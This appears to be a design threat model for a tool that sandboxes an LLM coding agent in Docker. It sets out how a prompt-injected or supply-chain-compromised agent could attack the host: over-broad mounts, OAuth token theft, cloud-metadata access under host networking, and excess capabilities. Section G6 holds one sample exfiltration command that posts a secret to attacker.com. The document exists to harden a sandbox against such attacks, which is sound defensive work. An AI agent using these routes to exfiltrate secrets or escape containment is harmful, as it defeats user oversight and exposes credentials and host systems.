# Trigon — Threat Model: Container → Host Escape & Attack

> Status: draft (2026-06-25). Scope: a compromised or adversarially-steered agent
> running **inside** a Trigon container attempting to attack the **host** (or
> host-adjacent resources). This document captures the threat model, the current
> security posture, the gaps ranked by realistic risk, and proposed controls.
> It is a design/discussion artifact — controls described here are proposals,
> not all implemented. Implemented vs. proposed is called out per item.

---

## 1. Premise

Trigon runs an LLM agent (Claude Code or OpenCode) inside a Docker container with
the user's project bind-mounted in. We assume the agent can be made to act against
the user's interest — not because the operator is malicious, but because the agent
is steered by **untrusted tokens** that arrive through legitimate channels. The
question this document answers: *if that happens, what can the agent do to the
host, and how do we limit it?*

---

## 2. What Trigon already does right

The baseline is better than most "agent in a box" setups. In the **default**
configuration (`--mode dev`, `--provider anthropic`, no extra flags) the
container→host wall is mostly intact:

- **Non-root by default** — `compose/base.yml`: `user: ${LOCAL_UID}:${LOCAL_GID}`
  maps the container process to the host caller's UID/GID. Files written to bind
  mounts land with the user's ownership, not root's.
- **No Docker socket mount anywhere** — confirmed by audit. This is the single
  most important thing done right: a mounted `/var/run/docker.sock` is trivial,
  instant host takeover. Trigon does not mount it.
- **No `privileged: true`**, no `--pid host`. Docker's default capability set
  already drops the dangerous ones (e.g. `SYS_ADMIN`).
- **`--air-gap`** exists as an opt-in network kill switch (`internal: true`
  Docker network).

The risk therefore lives in two places: **(a) what the user points the tool at**
(volume mounts), and **(b) the opt-in flags that deliberately punch holes in the
wall** (`--playwright`, `--playwright-headless`, `--yolo`, `--root`, `--mode
security`).

---

## 3. Threat model

### 3.1 Asset to protect
The **host** — its filesystem, credentials, network position, and other
processes / containers.

### 3.2 Trust boundary
The **container**. Everything inside is untrusted once we accept the premise.

### 3.3 Adversary
The **agent itself**, acting against the user's interest. This does not require a
human attacker. The agent is steered by untrusted input that arrives through
normal operation:

- **Prompt injection** via:
  - web content (Playwright / WebFetch),
  - file contents in the mounted repo,
  - MCP tool responses,
  - error messages, git history, dependency READMEs.
- **Supply chain**:
  - a compromised npm / pip / go dependency,
  - the agent package itself (`@anthropic-ai/claude-code` is installed `@latest`,
    unpinned),
  - a malicious `.mcp.json` shipped inside a cloned repo (Trigon reads/merges it).

### 3.4 Adversary goals (ordered by realism)

1. **Exfiltrate** secrets / source — needs only outbound network; **no escape
   required**.
2. **Reach host-adjacent resources** — localhost services, cloud metadata, LAN.
3. **Write to the host filesystem** beyond the intended project.
4. **Break containment** — kernel / runtime escape. Least likely, highest impact.

### 3.5 Key reframing
**Most damage does not require a container escape.** Exfiltration (#1) and
blast-radius-via-mounts (#3) are the high-probability paths and need no exploit.
A kernel escape (#4) is the movie-plot scenario. The boring stuff is what will
actually bite — prioritise accordingly.

---

## 4. Gaps, ranked by realistic risk

### G1 — Over-broad volume mounts *(highest likelihood)*
Nothing stops `trigon-up.sh /`, `trigon-up.sh ~`, or `trigon-up.sh ~/.ssh`. The
agent then has the user's own read/write rights to that whole tree — SSH keys,
`~/.aws`, `~/.config/gh`, browser profiles, other repos. Highest-likelihood
serious incident because it's a one-character mistake with no exploit needed.

Proposed mitigations:
- **Deny-list of sensitive roots**: refuse `/`, `$HOME`, `/etc`, `/root`, and
  known-secret dirs unless `--allow-unsafe-mount` is passed.
- **Resolve symlinks** before mounting and re-check against the deny-list
  (a symlink inside an "allowed" dir otherwise dodges it).
- **Default project mounts to `:ro`** where the workflow allows, with `--rw` to
  opt in — most valuable for `--prompt-file` pipeline runs.

Status: **implemented 2026-07-06** (deny-list of system roots, `$HOME`,
credential dirs and Trigon settings dirs; paths symlink-resolved via `pwd -P`
before checking; `--allow-unsafe-mount` overrides with a warning). `:ro`
default mounts remain **proposed**.

### G2 — Credential exposure via `/settings` (`$HOME`)
`${CLAUDE_SETTINGS_DIR}:/settings` is the agent's `$HOME` and holds `.claude.json`
(OAuth token) and any injected API key. The agent legitimately reads this, so
injection → exfiltrate the token/key is trivial and needs no escape.

Proposed mitigations:
- Prefer short-lived API keys over long-lived OAuth for pipeline runs.
- Mount only the subset the agent needs.
- Document that the settings dir is credential-bearing.
- Note: the `--api`-injected key is process-scoped env rather than on disk —
  that part is good.

Status: **partially mitigated** (env-scoped key); documentation/guidance pending.

### G3 — `--playwright` → `network_mode: host` *(biggest isolation hole)*
Host networking removes the network namespace entirely. The container can then
reach:
- **`169.254.169.254`** cloud metadata → IAM role credentials (cloud takeover).
- **`localhost` services** the host runs (Postgres, Redis, admin panels, other
  containers' bound ports) that assumed loopback == trusted.

A large, often-invisible escalation for "let the agent drive a browser."

Proposed mitigations:
- Prefer `--playwright-headless` (stays on bridge networking).
- If host networking is unavoidable, warn loudly and block the metadata IP
  (`169.254.169.254`) via an egress rule.

Status: **partial 2026-07-06** — `--playwright` now prints a loud host-networking
warning and, if the metadata service answers a probe, **refuses to launch**
unless `--allow-metadata` is passed (a host-netns container can't be firewalled
from an unprivileged launcher, so refusal replaces the egress rule). Blocking
the IP in the host firewall remains the stronger, user-side control.

### G4 — `--playwright-headless`: `ipc: host` + `SYS_PTRACE`
`ipc: host` shares the host SysV/POSIX shared-memory and semaphore namespace —
cross-tenant interference and an info-leak channel. It was added for Chromium's
shared-memory needs, but `--shm-size=...` (or `ipc: private` with a larger
`/dev/shm`) usually removes the need for `ipc: host` entirely. `SYS_PTRACE`
should be scoped as tightly as possible.

Proposed mitigations:
- Replace `ipc: host` with a sized private `/dev/shm`.
- Confirm `SYS_PTRACE` is actually required; drop if not.

Status: **not implemented.**

### G5 — `--yolo` / `--dangerously-skip-permissions` *(risk multiplier)*
Removes the human-in-the-loop, which is *the* mitigating control against
injection. It multiplies every other item.

Proposed mitigations:
- Forbid combining `--yolo` with unsafe mounts or host networking.
- Make `--prompt-file` non-interactive runs default to the most locked-down
  profile (no human is watching).

Status: **not implemented.**

### G6 — Default unrestricted egress = exfil channel
Even fully contained, the default bridge gives full outbound internet. Injection
→ `curl attacker.com -d @secret`. `--air-gap` fixes it but is opt-in and
incompatible with cloud providers.

Proposed mitigations:
- An **egress allow-list** (provider API + git host only) via a proxy/firewall
  sidecar. This is the natural growth path for the planned **M7 `--audit`**
  feature.

Status: **partial** (`--air-gap` exists; allow-list does not).

### G7 — No runtime hardening defaults
Missing across the board:
- `security_opt: no-new-privileges:true`
- `cap_drop: [ALL]` (then add back only what a mode needs)
- `pids_limit`
- `mem_limit` / `cpus`
- optionally `read_only: true` rootfs with tmpfs scratch

`no-new-privileges` and `cap_drop: ALL` are nearly free and shrink the escape
surface. Resource limits prevent a fork-bomb / OOM DoS on the host (low-skill,
high-annoyance attack).

Status: **implemented 2026-07-06** in `compose/base.yml` — `no-new-privileges`,
`cap_drop: ALL` (security mode adds back `NET_RAW`/`NET_ADMIN`,
`--playwright-headless` adds `SYS_PTRACE`, `--root` adds the baseline file/uid
caps dpkg needs), and `pids_limit`/`mem_limit`/`cpus` with `TRIGON_*` env
overrides (defaults 4096 / 8g / all host cores). Read-only rootfs remains
**proposed**.

### G8 — `security` mode `NET_ADMIN`
`compose/security.yml` adds `NET_RAW` + `NET_ADMIN`. `NET_RAW` (raw sockets for
nmap/ping) is reasonable for the mode. `NET_ADMIN` is much stronger —
interface / routing / iptables / netns manipulation — and is a meaningful
escalation primitive. Many recon tools need only `NET_RAW`.

Proposed mitigation:
- Confirm which tools require `NET_ADMIN`; drop it if unused.

Status: **not implemented.**

### G9 — Build-time supply chain
The image pulls:
- `ubuntu:24.04` (tag, not digest),
- `@anthropic-ai/claude-code@latest` (unpinned agent),
- `go install ...@latest` (unpinned tools),
- wordlists via `wget` with no checksum.

A compromised upstream = a malicious agent on the next build. Additionally, a
**cloned repo's own `.mcp.json`** gets read/merged — a malicious repo can
redirect the agent to an attacker-controlled MCP server.

Proposed mitigations:
- Pin base image by digest where practical.
- Pin the agent version (`--claude-version` flag exists — make pinning the
  documented default for production).
- Checksum downloaded artifacts.
- Treat project-supplied `.mcp.json` as untrusted input.

Status: **not implemented** (`--claude-version` available but not enforced).

---

## 5. Proposed approach — security profiles

Frame the controls as **profiles** rather than a pile of independent flags,
because the flags interact (`--yolo` × host-net × broad-mount is the danger zone):

| Profile | Intended use | Posture |
|---------|--------------|---------|
| **strict** | `--prompt-file` / CI (no human watching) | `cap_drop: ALL`, `no-new-privileges`, egress allow-list, resource limits, mount deny-list enforced, no host networking, read-only rootfs |
| **standard** | interactive default | today's posture + `cap_drop: ALL` + `no-new-privileges` + mount deny-list + resource limits (mostly invisible to users) |
| **trusted** | opt-in escape hatch | re-enables host networking, broad mounts, `--yolo`; requires explicit `--allow-unsafe` ack |

### Highest-ROI, near-zero-friction wins
1. **Mount deny-list** (G1) — ✅ implemented 2026-07-06
2. **`no-new-privileges` + `cap_drop: ALL`** (G7) — ✅ implemented 2026-07-06
3. **Resource limits** (G7) — ✅ implemented 2026-07-06
4. **Block the cloud-metadata IP under host networking** (G3) — ✅ implemented
   2026-07-06 as a reachability guard (refuse-to-launch, `--allow-metadata`
   override) since an unprivileged launcher cannot install an egress rule

These four cut realistic blast radius dramatically without changing any
workflow. Covered by `tests/cli/hardening.bats`.

---

## 6. Open questions

- **Where does Trigon actually run?** Personal laptop vs. the JSP production
  pipeline / a cloud VM changes the ranking. The cloud-metadata vector (G3) is
  catastrophic on a cloud box and irrelevant on an air-gapped laptop. If the JSP
  V2/V3 pipeline runs on cloud infra, G3 moves to the top.
- **Is a real sandbox runtime (gVisor / Kata) on the table**, or do we stay with
  stock runc + hardening? This is the line between "raise the bar" and "actually
  defend against kernel escape" (G-class #4).
- **Sequencing:** land this threat-model doc first (done), then prototype the
  cheap wins (mount deny-list + hardening defaults) in `trigon-up.sh` and
  `compose/base.yml`.

---

## 7. Control → gap traceability

| Control | Addresses | Cost | Status |
|---------|-----------|------|--------|
| Mount deny-list + symlink resolution | G1 | low | **implemented** (2026-07-06) |
| `:ro` project mounts (pipeline) | G1 | medium | proposed |
| Short-lived keys / scoped settings mount | G2 | low | partial |
| Prefer headless; block 169.254.169.254 | G3 | low | **implemented** as reachability guard (2026-07-06) |
| Private `/dev/shm` instead of `ipc: host` | G4 | low | proposed |
| Forbid `--yolo` × unsafe combos | G5 | low | proposed |
| Egress allow-list (M7 `--audit`) | G6 | high | proposed |
| `no-new-privileges` + `cap_drop: ALL` | G7 | low | **implemented** (2026-07-06) |
| `pids_limit` / `mem_limit` / `cpus` | G7 | low | **implemented** (2026-07-06) |
| Drop `NET_ADMIN` if unused | G8 | low | proposed |
| Pin agent / base image / checksums | G9 | medium | proposed |
| Treat repo `.mcp.json` as untrusted | G9 | medium | proposed |
| Security profiles (strict/standard/trusted) | all | medium | proposed |
| gVisor / Kata runtime | #4 escape | high | open question |
